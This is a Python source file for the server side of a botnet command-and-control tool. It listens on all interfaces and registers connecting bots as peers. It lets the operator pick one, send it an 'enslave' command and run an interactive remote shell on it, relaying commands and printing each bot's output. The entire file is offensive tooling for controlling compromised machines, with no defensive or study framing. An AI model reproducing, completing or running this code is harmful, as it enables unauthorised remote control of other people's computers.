import sys
from prototype import BotnetInterface, CryptoUtils, Envelope, Peer, socket, timeout, AF_INET, SOCK_STREAM
from prototype import Menu


class Server:
    interface: BotnetInterface
    connections_hash: dict = {}
    online: bool
    config: dict
    cipher: None

    def __init__(self):
        self.interface = BotnetInterface(insocket=socket(AF_INET, SOCK_STREAM))
        self.interface.distribute()
        self.config = self.interface.config
        self.cipher = CryptoUtils.new(self.config.get("settings").get("secret"))

    def bind_listen(self):
        self.interface.bind(('0.0.0.0', self.config.get('incoming').get('port')))
        self.interface.listen(self.config.get('incoming').get('backlog'))

    def accept(self):
        conn, addr = self.interface.accept()
        print('[+] new connection from %s:%s' % addr)
        envelope: Envelope = self.receive(connection=conn)
        peer = Peer(peer_id=envelope.DataText, peer=conn, address=addr, online=True)
        self.connections_hash.setdefault(peer.Id, peer)
        envelope = Envelope(data=True)
        self.interface.send(data=envelope, connection=peer.Socket)
        return True

    def send(self, connection, data):
        self.interface.send(data=data, connection=connection)

    def receive(self, connection):
        return self.interface.receive(connection=connection)

    def run(self):
        Menu.welcome()
        self.bind_listen()
        while True:
            Menu.refresh(self)
            try:
                try:
                    self.interface.incoming.settimeout(60)
                    status = self.accept()
                    if status:
                        _ = input('[!] interact? (Y/n)')
                        if 'y' in _.lower():
                            raise KeyboardInterrupt()
                        else:
                            continue
                except timeout:
                    continue
            except KeyboardInterrupt:
                peer: Peer = Menu.refresh_connections_list(self.connections_hash)
                envelope: Envelope = self.receive(peer.Socket)
                print("[%s] is now %s" % (peer.Id, envelope.DataText))
                while True:
                    envelope = Envelope(data="enslave")
                    self.send(peer.Socket, envelope)
                    envelope: Envelope = self.receive(peer.Socket)
                    stdout = envelope.DataText.decode() if isinstance(envelope.DataText, bytes) else envelope.DataText
                    if stdout.__contains__(':terminated'):
                        sys.stdout.write(stdout)
                        self.connections_hash.pop(peer.Id)
                        break
                    cwd, out = tuple(stdout.split('\n', 1))
                    sys.stdout.write(out)
                    stdin = input("\n"+cwd)
                    if stdin == 'exit':
                        break
                    envelope = Envelope(data=stdin)
                    self.send(peer.Socket, envelope)
            Menu.clear_console()
            continue
